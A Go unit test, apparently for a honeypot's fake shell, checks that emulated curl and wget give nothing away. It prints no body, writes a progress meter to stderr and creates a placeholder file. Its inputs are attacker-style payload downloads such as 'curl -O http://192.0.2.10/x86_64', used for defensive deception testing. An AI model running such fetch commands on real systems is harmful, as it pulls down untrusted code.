// curl never fetches anything, so it must not print a body that gives the
// game away; the progress meter goes to stderr like the real one.
func TestCurlPrintsNoBody(t *testing.T) {
	in, s := testSession(t)
	out, _, st := run(t, in, s, "curl http://192.0.2.10/x.sh")
	if st != 0 || out != "" {
		t.Errorf("curl body = %d %q", st, out)
	}
	run(t, in, s, "cd /tmp")
	out, errb, _ := run(t, in, s, "curl -O http://192.0.2.10/x86_64")
	if out != "" || !strings.Contains(errb, "% Total") || !s.FS.Exists("/tmp/x86_64") {
		t.Errorf("curl -O = %q %q", out, errb)
	}
	if out, _, _ := run(t, in, s, "wget -qO- http://203.0.113.9/i"); out != "" {
		t.Errorf("wget -qO- = %q", out)
	}
	if s.FS.Exists("/tmp/-") {
		t.Errorf("wget -O- created a file named -")
	}
}

